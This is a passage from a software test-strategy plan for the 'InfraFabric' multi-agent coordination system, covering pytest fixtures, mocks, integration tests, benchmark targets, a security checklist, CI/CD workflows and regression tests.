            'required_capabilities': [Capability.INTEGRATION_SIP, Capability.INTEGRATION_NDI],
            'expected_helpers': ['session-1-ndi'],
            'max_budget': 10.0
        },
        # ... more scenarios
    ]
```

### Chassis Fixtures
```python
# tests/fixtures/chassis_fixtures.py

@pytest.fixture
def sample_wasm_module():
    """Minimal WASM module for testing"""
    # Compile a simple Rust/AssemblyScript module
    return compile_wasm("""
        export function execute_task(task) {
            return { status: 'success' };
        }
    """)


@pytest.fixture
def service_contracts():
    """Sample service contracts"""
    return {
        'session-1-ndi': ServiceContract(
            swarm_id='session-1-ndi',
            capabilities=['integration:ndi'],
            resource_requirements=ResourceLimits(
                max_memory_mb=256,
                max_cpu_percent=25,
                max_api_calls_per_second=10,
                max_execution_time_seconds=300
            ),
            slos=ServiceLevelObjective(
                p99_latency_ms=500,
                success_rate=0.95,
                availability=0.99
            ),
            version='1.0.0'
        ),
        # ... 6 more
    }


@pytest.fixture
def scoped_credentials_factory():
    """Factory for creating scoped credentials"""
    def _factory(swarm_id, task_id, ttl=300):
        return ScopedCredentials(
            swarm_id=swarm_id,
            task_id=task_id,
            api_token=f'temp-token-{task_id}',
            ttl_seconds=ttl,
            allowed_endpoints=['https://api.openai.com/v1/chat/completions']
        )
    return _factory
```

**Fixture Usage:**
```python
# tests/integration/test_with_fixtures.py

def test_with_fixtures(coordinator_with_swarms, sample_tasks):
    """Tests automatically get pre-configured fixtures"""
    # coordinator_with_swarms has 7 swarms already registered
    # sample_tasks has pre-defined task definitions
    pass
```

---

## 3. Mock Strategies for External Services

**Mock Hierarchy:**

### Level 1: In-Memory Mocks (Fast, Unit Tests)
```python
# tests/mocks/mock_etcd.py

class MockEtcdClient:
    """In-memory etcd for fast unit tests"""

    def __init__(self):
        self.data = {}

    def put(self, key, value):
        self.data[key] = value

    def get(self, key):
        return (self.data.get(key, None), None)

    def replace(self, key, initial_value, new_value):
        """Atomic CAS operation"""
        if self.data.get(key) == initial_value:
            self.data[key] = new_value
            return True
        return False

    def delete_prefix(self, prefix):
        keys_to_delete = [k for k in self.data.keys() if k.startswith(prefix)]
        for k in keys_to_delete:
            del self.data[k]


@pytest.fixture
def mock_etcd(monkeypatch):
    """Replace real etcd with mock"""
    mock = MockEtcdClient()
    monkeypatch.setattr('etcd3.client', lambda **kwargs: mock)
    return mock
```

### Level 2: Docker Testcontainers (Real Services, Integration Tests)
```python
# tests/mocks/testcontainers_fixtures.py

from testcontainers.compose import DockerCompose

@pytest.fixture(scope='session')
def etcd_container():
    """Real etcd in Docker container"""
    with DockerCompose('/home/user/infrafabric', compose_file_name='docker-compose.test.yml') as compose:
        compose.wait_for('http://localhost:2379/health')
        yield 'localhost:2379'


@pytest.fixture(scope='session')
def nats_container():
    """Real NATS in Docker container"""
    with DockerCompose('/home/user/infrafabric', compose_file_name='docker-compose.test.yml') as compose:
        compose.wait_for('nats://localhost:4222')
        yield 'localhost:4222'
```

### Level 3: API Mocks (OpenAI, External APIs)
```python
# tests/mocks/mock_openai.py

import respx
import httpx

@pytest.fixture
def mock_openai_api():
    """Mock OpenAI API responses"""
    with respx.mock:
        respx.post('https://api.openai.com/v1/chat/completions').mock(
            return_value=httpx.Response(
                200,
                json={
                    'id': 'chatcmpl-test',
                    'choices': [{
                        'message': {
                            'role': 'assistant',
                            'content': 'Test response'
                        }
                    }],
                    'usage': {
                        'prompt_tokens': 10,
                        'completion_tokens': 20,
                        'total_tokens': 30
                    }
                }
            )
        )
        yield
```

**Mock Selection Strategy:**

| Test Level | Mock Type | Speed | Fidelity | Use Case |
|-----------|-----------|-------|----------|----------|
| Unit | In-memory | Fastest | Low | Component isolation |
| Integration | Testcontainers | Medium | High | Cross-component |
| E2E | Real services | Slowest | Highest | Production validation |
| Security | Real services | Slow | Highest | Threat modeling |
| Performance | Real services | Slow | Highest | Benchmarking |

---

## 4. Cross-Component Integration Points

**Integration Matrix:**

| Component A | Component B | Integration Point | Test |
|------------|------------|-------------------|------|
| IF.coordinator | etcd | State storage | `test_coordinator_etcd_persistence` |
| IF.coordinator | IF.governor | Task assignment | `test_coordinator_governor_handoff` |
| IF.governor | IF.coordinator | Swarm registry | `test_governor_queries_coordinator` |
| IF.governor | IF.chassis | Resource monitoring | `test_governor_chassis_metrics` |
| IF.chassis | WASM runtime | Sandbox execution | `test_chassis_wasm_execution` |
| IF.chassis | IF.governor | Reputation updates | `test_chassis_reputation_feedback` |
| IF.witness | All components | Audit logging | `test_witness_logs_all_operations` |
| IF.optimise | All components | Cost tracking | `test_optimise_tracks_costs` |

**Critical Integration Tests:**

```python
# tests/integration/test_cross_component.py

@pytest.mark.asyncio
async def test_coordinator_governor_task_assignment():
    """
    Test IF.coordinator → IF.governor integration

    Flow:
    1. Coordinator detects blocker
    2. Coordinator calls governor.request_help_for_blocker()
    3. Governor finds qualified swarms
    4. Coordinator pushes tasks to selected swarms
    """
    coordinator = IFCoordinator()
    governor = IFGovernor(coordinator=coordinator, policy=default_policy())

    # Setup swarms
    # ... (register swarms)

    # Trigger blocker
    await coordinator.detect_blocker('session-4-sip', {
        'required_capabilities': [Capability.INTEGRATION_SIP]
    })

    # Governor should receive notification and assign help
    # ... (verify assignment)


@pytest.mark.asyncio
async def test_chassis_governor_reputation_feedback():
    """
    Test IF.chassis → IF.governor integration

    Flow:
    1. Chassis executes task
    2. Chassis tracks performance metrics
    3. Chassis calculates reputation score
    4. Chassis updates governor with new reputation
    5. Governor uses updated reputation for next assignment
    """
    governor = IFGovernor(coordinator=None, policy=default_policy())
    chassis = IFChassis()

    # Initial reputation: 1.0
    governor.register_swarm(SwarmProfile(
        swarm_id='swarm-test',
        capabilities=[Capability.CODE_ANALYSIS_RUST],
        cost_per_hour=2.0,
        reputation_score=1.0,
        current_budget_remaining=10.0
    ))

    # Execute task, violate SLO
    # ... (simulate slow execution)

    # Reputation should decrease
    updated_profile = governor.swarm_registry['swarm-test']
    assert updated_profile.reputation_score < 1.0


@pytest.mark.asyncio
async def test_witness_logs_all_operations():
    """
    Test IF.witness integration with all components

    Flow:
    1. Coordinator claims task → witness logs
    2. Governor assigns swarm → witness logs
    3. Chassis executes task → witness logs
    4. All events traceable with provenance chain
    """
    from infrafabric.witness import get_logs

    # Execute workflow
    # ... (run full coordination flow)

    # Verify all operations logged
    logs = get_logs(component='IF.coordinator')
    assert len(logs) > 0
    assert logs[0]['operation'] == 'task_claimed'

    logs = get_logs(component='IF.governor')
    assert logs[0]['operation'] == 'help_requested'

    logs = get_logs(component='IF.chassis')
    assert logs[0]['operation'] == 'swarm_loaded'
```

---

## 5. Test Execution Order (Dependencies)

**Test Dependency Graph:**

```
Phase 0: Infrastructure Setup
├── Start etcd container
├── Start NATS container (optional)
├── Start Prometheus/Grafana (monitoring)
└── Verify connectivity

Phase 1: Unit Tests (Parallel)
├── IF.coordinator unit tests
├── IF.governor unit tests
└── IF.chassis unit tests

Phase 2: Integration Tests (Sequential within groups)
├── Group A: Coordinator + etcd
├── Group B: Governor + Coordinator
└── Group C: Chassis + Governor

Phase 3: E2E Tests (Sequential)
├── Full Phase 0 deployment
├── 7-session parallel execution
└── Gang Up on Blocker workflow

Phase 4: Security Tests (Parallel)
├── WASM sandbox isolation
├── Credential scoping
└── Rate limiting

Phase 5: Performance Tests (Sequential)
├── Latency benchmarks
├── Throughput benchmarks
└── Scalability tests

Phase 6: Regression Tests (Parallel)
├── All previously passing tests
└── Bug fix validation
```

**Execution Commands:**

```bash
# Full test suite (all phases)
pytest tests/ -v --tb=short --maxfail=5

# Phase-by-phase execution
pytest tests/unit/ -v                    # Phase 1
pytest tests/integration/ -v             # Phase 2
pytest tests/e2e/ -v -m e2e             # Phase 3
pytest tests/security/ -v -m security   # Phase 4
pytest tests/performance/ -v            # Phase 5

# With dependency enforcement
pytest tests/ -v --dependency-graph=test_deps.yml

# Parallel execution (within phases)
pytest tests/unit/ -v -n 4  # 4 parallel workers
```

---

## 6. Performance Benchmarks

**Benchmark Targets (from S2-CRITICAL-BUGS-AND-FIXES.md):**

### Latency Benchmarks

| Metric | Baseline (Git) | Target (Phase 0) | Test Command |
|--------|---------------|------------------|--------------|
| Task push latency (p99) | 30,000ms | <10ms | `pytest tests/performance/test_benchmarks.py::test_coordinator_latency_p99` |
| Task claim latency | 30,000ms | <5ms | `pytest tests/performance/test_benchmarks.py::test_task_claim_latency` |
| Blocker detection | 30,000-60,000ms | <10ms | `pytest tests/performance/test_benchmarks.py::test_blocker_detection_latency` |
| Capability matching | N/A | <20ms | `pytest tests/performance/test_benchmarks.py::test_capability_matching_latency` |
| E2E "Gang Up" flow | 62,000ms | <60ms | `pytest tests/e2e/test_s2_deployment.py::test_gang_up_latency` |

### Scalability Benchmarks

| Metric | Baseline (Git) | Target (Phase 0) | Test Command |
|--------|---------------|------------------|--------------|
| Max concurrent swarms | ~100 | 1,000+ | `pytest tests/performance/test_benchmarks.py::test_1000_concurrent_swarms` |
| Throughput (tasks/sec) | 3.3 | 1,000+ | `pytest tests/performance/test_benchmarks.py::test_throughput_1000_tps` |
| Memory per swarm | Unknown | <256MB | `pytest tests/performance/test_benchmarks.py::test_memory_footprint` |

### Cost Benchmarks

| Metric | Baseline (Git) | Target (Phase 0) | Test Command |
|--------|---------------|------------------|--------------|
| Capability match rate | 0% (random) | 70%+ | `pytest tests/unit/test_governor.py::test_capability_matching_70_percent` |
| Budget overrun rate | 57% (measured) | 0% | `pytest tests/integration/test_cost_spiral_prevention.py` |
| Circuit breaker activation | Never | 100% on overrun | `pytest tests/unit/test_governor.py::test_circuit_breaker_on_budget_exhausted` |

**Success Criteria Summary:**

✅ **PASS**: All benchmarks within 10% of target
⚠️ **WARNING**: Benchmarks within 10-25% of target
❌ **FAIL**: Benchmarks >25% from target

---

## 7. Security Audit Checklist

**Pre-Deployment Security Validation:**

### WASM Sandbox Security

- [ ] **Test:** WASM cannot access host filesystem
  - Command: `pytest tests/security/test_security_boundaries.py::test_wasm_sandbox_filesystem_isolation`
  - Success: PermissionError raised on filesystem access attempt

- [ ] **Test:** WASM cannot make arbitrary network requests
  - Command: `pytest tests/security/test_security_boundaries.py::test_wasm_sandbox_network_isolation`
  - Success: PermissionError raised on network access attempt

- [ ] **Test:** WASM cannot execute host commands
  - Command: `pytest tests/security/test_security_boundaries.py::test_wasm_no_exec`
  - Success: No shell access from WASM

- [ ] **Test:** Memory limits enforced
  - Command: `pytest tests/unit/test_chassis.py::test_memory_isolation_enforcement`
  - Success: MemoryError raised on limit exceeded

- [ ] **Test:** CPU limits enforced
  - Command: `pytest tests/security/test_security_boundaries.py::test_cpu_limit_enforcement`
  - Success: Task killed on CPU time exceeded

### Credential Security

- [ ] **Test:** Scoped credentials expire after TTL
  - Command: `pytest tests/unit/test_chassis.py::test_scoped_credentials_expiration`
  - Success: Credentials rejected after expiration

- [ ] **Test:** Credential endpoint whitelist enforced
  - Command: `pytest tests/security/test_security_boundaries.py::test_credential_scope_enforcement`
  - Success: Requests to non-whitelisted endpoints blocked

- [ ] **Test:** No long-lived API keys in swarm memory
  - Command: `pytest tests/security/test_security_boundaries.py::test_no_persistent_credentials`
  - Success: Only temporary tokens visible to swarms

- [ ] **Test:** Credentials cannot be shared between swarms
  - Command: `pytest tests/security/test_security_boundaries.py::test_credential_isolation`
  - Success: Swarm A cannot use Swarm B's credentials

### State Security

- [ ] **Test:** etcd requires authentication
  - Command: `pytest tests/security/test_security_boundaries.py::test_etcd_authentication`
  - Success: Unauthenticated access denied

- [ ] **Test:** etcd TLS encryption enabled
  - Command: `pytest tests/security/test_security_boundaries.py::test_etcd_tls`
  - Success: Unencrypted connections rejected

- [ ] **Test:** Task injection prevention
  - Command: `pytest tests/security/test_security_boundaries.py::test_task_injection_prevention`
  - Success: Malicious task IDs sanitized

- [ ] **Test:** Budget manipulation prevention
  - Command: `pytest tests/security/test_security_boundaries.py::test_budget_manipulation_prevention`
  - Success: Swarms cannot modify own budget

### Isolation Security

- [ ] **Test:** Noisy neighbor prevention
  - Command: `pytest tests/integration/test_noisy_neighbor_isolation.py`
  - Success: One swarm cannot starve others

- [ ] **Test:** Cross-swarm data leakage prevention
  - Command: `pytest tests/security/test_security_boundaries.py::test_cross_swarm_isolation`
  - Success: Swarm A cannot read Swarm B's data

- [ ] **Test:** Rate limiting bypass prevention
  - Command: `pytest tests/security/test_security_boundaries.py::test_rate_limiting_bypass`
  - Success: Rate limits cannot be circumvented

**Security Audit Report Generation:**

```bash
# Run all security tests and generate report
pytest tests/security/ -v --tb=short \
  --html=security-audit-report.html \
  --self-contained-html \
  --security-checklist=checklist.md

# Output: security-audit-report.html with pass/fail for each item
```

---

## 8. Session Assignments for Testing

**S² Testing Sessions (7 Sessions):**

### Session 1: IF.coordinator Testing
**Capabilities:** Real-time coordination, etcd integration
**Assigned Tests:**
- `tests/unit/test_coordinator.py` (all)
- `tests/integration/test_coordinator_etcd.py`
- `tests/performance/test_coordinator_latency_p99.py`

**Budget:** $5
**Timeline:** 2-3 hours
**Success Criteria:** All coordinator tests pass, <10ms latency achieved

### Session 2: IF.governor Testing
**Capabilities:** Capability matching, budget enforcement
**Assigned Tests:**
- `tests/unit/test_governor.py` (all)
- `tests/integration/test_governor_policies.py`
- `tests/integration/test_cost_spiral_prevention.py`

**Budget:** $5
**Timeline:** 2-3 hours
**Success Criteria:** 70%+ capability match, 100% circuit breaker activation

### Session 3: IF.chassis Testing
**Capabilities:** WASM sandbox, resource isolation
**Assigned Tests:**
- `tests/unit/test_chassis.py` (all)
- `tests/security/test_wasm_sandbox.py`
- `tests/performance/test_chassis_overhead.py`

**Budget:** $5
**Timeline:** 3-4 hours
**Success Criteria:** All sandbox isolation tests pass, <100ms overhead

### Session 4: Integration Testing (Critical Path)
**Capabilities:** Cross-component integration
**Assigned Tests:**
- `tests/integration/test_coordinator_governor_integration.py`
- `tests/integration/test_gang_up_on_blocker.py`
- `tests/e2e/test_s2_deployment.py`

**Budget:** $10 (critical path)
**Timeline:** 4-5 hours
**Success Criteria:** Full E2E workflow passes, <60ms end-to-end latency

### Session 5: Security Testing
**Capabilities:** Penetration testing, threat modeling
**Assigned Tests:**
- `tests/security/test_security_boundaries.py` (all)
- `tests/security/test_penetration.py`
- Security audit checklist validation

**Budget:** $8
**Timeline:** 3-4 hours
**Success Criteria:** All security controls validated, no critical vulnerabilities

### Session 6: Performance Testing
**Capabilities:** Benchmarking, scalability validation
**Assigned Tests:**
- `tests/performance/test_benchmarks.py` (all)
- `tests/performance/test_scalability.py`
- Performance report generation

**Budget:** $5
**Timeline:** 2-3 hours
**Success Criteria:** All performance targets met, 1000+ swarms supported

### Session 7: Regression & CI/CD
**Capabilities:** Automation, continuous testing
**Assigned Tests:**
- Regression test suite setup
- CI/CD pipeline configuration
- Test infrastructure management

**Budget:** $5
**Timeline:** 2-3 hours
**Success Criteria:** All tests automated, CI passing

**Total Budget:** $43
**Total Timeline:** 18-25 hours sequential → **4-6 hours wall-clock** (S² parallelization)

**Coordination:**
- All sessions report status to `tests/STATUS-TESTING.md`
- Session 4 is critical path - Sessions 1-3 help if blocked
- Session 7 coordinates test infrastructure
- "Gang Up on Blocker" pattern applies if any session stuck

---

## 9. CI/CD Integration

**GitHub Actions Workflow:**

```yaml
# .github/workflows/phase-0-tests.yml

name: Phase 0 Integration Tests

on:
  push:
    branches: [ main, 'claude/**' ]
  pull_request:
    branches: [ main ]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        component: [coordinator, governor, chassis]
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'

      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements-test.txt

      - name: Run unit tests - ${{ matrix.component }}
        run: |
          pytest tests/unit/test_${{ matrix.component }}.py -v \
            --cov=src/infrafabric/${{ matrix.component }} \
            --cov-report=xml \
            --junitxml=test-results-${{ matrix.component }}.xml

      - name: Upload coverage
        uses: codecov/codecov-action@v3
        with:
          files: ./coverage.xml
          flags: ${{ matrix.component }}

  integration-tests:
    runs-on: ubuntu-latest
    needs: unit-tests
    services:
      etcd:
        image: quay.io/coreos/etcd:v3.5.0
        ports:
          - 2379:2379
          - 2380:2380
        options: >-
          --health-cmd "etcdctl endpoint health"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5

    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'

      - name: Install dependencies
        run: |
          pip install -r requirements-test.txt

      - name: Run integration tests
        run: |
          pytest tests/integration/ -v \
            --tb=short \
            --junitxml=test-results-integration.xml
        env:
          ETCD_HOST: localhost
          ETCD_PORT: 2379

  e2e-tests:
    runs-on: ubuntu-latest
    needs: integration-tests
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'

      - name: Start infrastructure
        run: |
          docker-compose -f docker-compose.test.yml up -d
          sleep 10  # Wait for services

      - name: Run E2E tests
        run: |
          pytest tests/e2e/ -v -m e2e \
            --junitxml=test-results-e2e.xml

      - name: Teardown infrastructure
        if: always()
        run: |
          docker-compose -f docker-compose.test.yml down

  security-tests:
    runs-on: ubuntu-latest
    needs: integration-tests
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'

      - name: Run security tests
        run: |
          pytest tests/security/ -v -m security \
            --security-report=security-audit.html \
            --junitxml=test-results-security.xml

      - name: Upload security report
        uses: actions/upload-artifact@v3
        with:
          name: security-audit-report
          path: security-audit.html

  performance-tests:
    runs-on: ubuntu-latest
    needs: integration-tests
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'

      - name: Run performance benchmarks
        run: |
          pytest tests/performance/ -v \
            --benchmark-only \
            --benchmark-autosave \
            --benchmark-compare=baseline \
            --junitxml=test-results-performance.xml

      - name: Upload benchmark results
        uses: actions/upload-artifact@v3
        with:
          name: benchmark-results
          path: .benchmarks/

  regression-tests:
    runs-on: ubuntu-latest
    needs: [unit-tests, integration-tests, e2e-tests, security-tests, performance-tests]
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'

      - name: Run full regression suite
        run: |
          pytest tests/ -v \
            --regression \
            --tb=short \
            --maxfail=10 \
            --junitxml=test-results-regression.xml

      - name: Generate test summary
        if: always()
        run: |
          python scripts/generate_test_summary.py \
            --input test-results-*.xml \
            --output test-summary.md

      - name: Comment PR with results
        if: github.event_name == 'pull_request'
        uses: actions/github-script@v6
        with:
          script: |
            const fs = require('fs');
            const summary = fs.readFileSync('test-summary.md', 'utf8');
            github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: summary
            });
```

**Docker Compose for Testing:**

```yaml
# docker-compose.test.yml

version: '3.8'

services:
  etcd:
    image: quay.io/coreos/etcd:v3.5.0
    ports:
      - "2379:2379"
      - "2380:2380"
    environment:
      - ETCD_LISTEN_CLIENT_URLS=http://0.0.0.0:2379
      - ETCD_ADVERTISE_CLIENT_URLS=http://localhost:2379
    healthcheck:
      test: ["CMD", "etcdctl", "endpoint", "health"]
      interval: 10s
      timeout: 5s
      retries: 5

  nats:
    image: nats:latest
    ports:
      - "4222:4222"
    healthcheck:
      test: ["CMD", "nc", "-z", "localhost", "4222"]
      interval: 10s
      timeout: 5s
      retries: 5

  prometheus:
    image: prom/prometheus:latest
    ports:
      - "9090:9090"
    volumes:
      - ./monitoring/prometheus.yml:/etc/prometheus/prometheus.yml

  grafana:
    image: grafana/grafana:latest
    ports:
      - "3000:3000"
    environment:
      - GF_SECURITY_ADMIN_PASSWORD=admin
```

**CI Success Criteria:**

✅ **All jobs pass**: Unit, Integration, E2E, Security, Performance
✅ **Code coverage**: >90% for Phase 0 components
✅ **No critical security vulnerabilities**
✅ **All performance benchmarks met**
✅ **Regression tests pass** (no previous bugs reintroduced)

---

## 10. Regression Test Strategy

**Regression Test Categories:**

### Bug Fix Validation (Critical Bugs from S2-CRITICAL-BUGS-AND-FIXES.md)

```python
# tests/regression/test_bug_fixes.py

@pytest.mark.regression
@pytest.mark.asyncio
async def test_bug_1_race_conditions_eliminated():
    """
    Regression: Bug #1 - Race conditions in task claiming

    Original bug: Two swarms could claim same task (git polling, no atomic ops)
    Fix: IF.coordinator with atomic CAS operations

    This test MUST always pass to prevent regression.
    """
    coordinator = IFCoordinator()

    # Simulate 100 concurrent claim attempts
    for i in range(100):
        task_id = f'task-{i}'
        coordinator.etcd.put(f'/tasks/{task_id}/owner', 'unclaimed')

        # 10 swarms try to claim simultaneously
        results = await asyncio.gather(*[
            coordinator.claim_task(f'swarm-{j}', task_id)
            for j in range(10)
        ])

        # EXACTLY one should succeed
        assert sum(results) == 1, f"Race condition detected on task {task_id}!"


@pytest.mark.regression
@pytest.mark.asyncio
async def test_bug_2_capability_mismatch_prevented():
    """
    Regression: Bug #2 - Unqualified swarms assigned to tasks

    Original bug: LegalSwarm assigned to Rust debugging (no capability check)
    Fix: IF.governor with 70%+ capability match requirement

    This test MUST always pass to prevent regression.
    """
    governor = IFGovernor(coordinator=None, policy=ResourcePolicy(min_capability_match=0.7))

    # Register legal swarm (wrong expertise)
    governor.register_swarm(SwarmProfile(
        swarm_id='legal-swarm',
        capabilities=[Capability.CONTRACT_REVIEW_NDA],
        cost_per_hour=5.0,
        reputation_score=1.0,
        current_budget_remaining=10.0
    ))

    # Try to assign Rust task
    swarm = governor.find_qualified_swarm(
        required_capabilities=[Capability.CODE_ANALYSIS_RUST],
        max_cost=10.0
    )

    # Should NOT assign legal swarm to Rust task
    assert swarm is None, "Unqualified swarm incorrectly assigned!"


@pytest.mark.regression
@pytest.mark.asyncio
async def test_bug_3_noisy_neighbor_contained():
    """
    Regression: Bug #3 - One swarm exhausts shared API rate limit

    Original bug: Swarm-7 infinite loop starves all other swarms
    Fix: IF.chassis with per-swarm rate limiting

    This test MUST always pass to prevent regression.
    """
    # Identical to integration test, but in regression suite
    # Ensures bug never resurfaces
    pass
```

### Regression Test Execution

```bash
# Run all regression tests
pytest tests/regression/ -v -m regression

# Run regression tests for specific bug
pytest tests/regression/test_bug_fixes.py::test_bug_1_race_conditions_eliminated -v

# Compare with baseline (git polling implementation)
pytest tests/regression/ -v --compare-baseline=git_polling

# Regression dashboard
pytest tests/regression/ --regression-report=regression-dashboard.html
```

### Continuous Regression Monitoring

```yaml
# .github/workflows/regression-monitoring.yml

name: Continuous Regression Monitoring

on:
  schedule:
    - cron: '0 */6 * * *'  # Every 6 hours

jobs:
  regression-check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Run regression suite
        run: |
          pytest tests/regression/ -v -m regression \
            --junitxml=regression-results.xml

      - name: Alert on failure
        if: failure()
        uses: actions/github-script@v6
        with:
          script: |
            github.rest.issues.create({
              owner: context.repo.owner,
              repo: context.repo.repo,
              title: '🚨 REGRESSION DETECTED: Critical bug reintroduced',
              body: 'Regression test failed. Check regression-results.xml for details.',
              labels: ['regression', 'critical']
            });
```

---

## Test Execution Summary

**Quick Reference:**

```bash
# Development Workflow
pytest tests/unit/test_coordinator.py -v           # Test single component
pytest tests/unit/ -v -n 4                         # All unit tests (parallel)

# Integration Testing
docker-compose -f docker-compose.test.yml up -d    # Start infrastructure
pytest tests/integration/ -v                       # Run integration tests

# Pre-Commit Checks
pytest tests/unit/ tests/integration/ -v --maxfail=5

# Full Validation (Pre-Deploy)
pytest tests/ -v --tb=short                        # All tests

# CI/CD Pipeline
# Triggered automatically on push/PR
# See .github/workflows/phase-0-tests.yml

# Performance Benchmarking
pytest tests/performance/ --benchmark-only --benchmark-autosave

# Security Audit
pytest tests/security/ -v -m security --security-report=audit.html

# Regression Monitoring
pytest tests/regression/ -v -m regression
```

---

## Success Metrics

**Phase 0 Testing Completion Criteria:**

| Category | Target | Current | Status |
|----------|--------|---------|--------|
| **Unit Test Coverage** | 90%+ | ⬜ TBD | ⬜ Pending |
| **Integration Tests Passing** | 100% | ⬜ TBD | ⬜ Pending |
| **E2E Tests Passing** | 100% | ⬜ TBD | ⬜ Pending |
| **Security Tests Passing** | 100% | ⬜ TBD | ⬜ Pending |
| **Performance Benchmarks Met** | 100% | ⬜ TBD | ⬜ Pending |
| **Coordinator Latency (p99)** | <10ms | ⬜ TBD | ⬜ Pending |
| **Scalability (Concurrent Swarms)** | 1000+ | ⬜ TBD | ⬜ Pending |
| **Capability Match Rate** | 70%+ | ⬜ TBD | ⬜ Pending |
| **Circuit Breaker Activation** | 100% | ⬜ TBD | ⬜ Pending |
| **Zero Race Conditions** | 100% | ⬜ TBD | ⬜ Pending |

**Definition of Done:**

✅ All unit tests pass with 90%+ coverage
✅ All integration tests pass
✅ All E2E tests pass
✅ All security tests pass
✅ All performance benchmarks met
✅ No critical security vulnerabilities
✅ Regression tests protect against all known bugs
✅ CI/CD pipeline green
✅ Documentation complete

---

## Appendix

### A. Test File Structure

```
tests/
├── unit/
│   ├── test_coordinator.py         # IF.coordinator unit tests
│   ├── test_governor.py             # IF.governor unit tests
│   └── test_chassis.py              # IF.chassis unit tests
├── integration/
│   ├── test_coordinator_governor_integration.py
│   ├── test_gang_up_on_blocker.py
│   ├── test_noisy_neighbor_isolation.py
│   └── test_external_services.py
├── e2e/
│   ├── test_s2_deployment.py
│   ├── test_7_session_parallel.py
│   └── test_gang_up_latency.py
├── security/
│   ├── test_security_boundaries.py
│   ├── test_wasm_sandbox.py
│   └── test_penetration.py
├── performance/
│   ├── test_benchmarks.py
│   ├── test_scalability.py
│   └── test_latency.py
├── regression/
│   └── test_bug_fixes.py
├── fixtures/
│   ├── coordinator_fixtures.py
│   ├── governor_fixtures.py
│   └── chassis_fixtures.py
├── mocks/
│   ├── mock_etcd.py
│   ├── mock_nats.py
│   └── mock_openai.py
└── conftest.py                      # Shared pytest configuration
```

### B. Dependencies

```txt
# requirements-test.txt

pytest==7.4.3
pytest-asyncio==0.21.1
pytest-cov==4.1.0
pytest-xdist==3.5.0          # Parallel execution
pytest-benchmark==4.0.0      # Performance benchmarking
pytest-html==4.1.1           # HTML reports
respx==0.20.2                # HTTP mocking
testcontainers==3.7.1        # Docker containers for testing
etcd3==0.12.0
wasmtime==14.0.0             # WASM runtime
psutil==5.9.6                # Resource monitoring
```

### C. Helper Scripts

```bash
# scripts/run_all_tests.sh

#!/bin/bash
set -e

echo "🧪 Running Phase 0 Integration Test Strategy..."

# Start infrastructure
echo "📦 Starting test infrastructure..."
docker-compose -f docker-compose.test.yml up -d
sleep 10

# Unit tests
echo "1️⃣ Running unit tests..."
pytest tests/unit/ -v -n 4 --cov=src/infrafabric --cov-report=html

# Integration tests
echo "2️⃣ Running integration tests..."
pytest tests/integration/ -v --tb=short

# E2E tests
echo "3️⃣ Running E2E tests..."
pytest tests/e2e/ -v -m e2e

# Security tests
echo "4️⃣ Running security tests..."
pytest tests/security/ -v -m security --security-report=security-audit.html

# Performance tests
echo "5️⃣ Running performance tests..."
pytest tests/performance/ -v --benchmark-only --benchmark-autosave

# Regression tests
echo "6️⃣ Running regression tests..."
pytest tests/regression/ -v -m regression

# Cleanup
echo "🧹 Cleaning up..."
docker-compose -f docker-compose.test.yml down

echo "✅ All tests complete!"
```

---

**Document Status:** Planning - Ready for implementation
**Next Steps:**
1. Review test strategy with team
2. Assign sessions for test implementation (7 sessions, 4-6 hours wall-clock)
3. Implement test infrastructure (etcd, monitoring)
4. Execute Phase 0 testing
5. Validate all benchmarks met
6. Proceed to Phase 1.5 (vMix/OBS/HA) with confidence

**Prepared by:** Session 7 (Orchestrator)
**Date:** 2025-11-12
**Branch:** claude/debug-session-freezing-011CV2mM1FVCwsC8GoBR2aQy
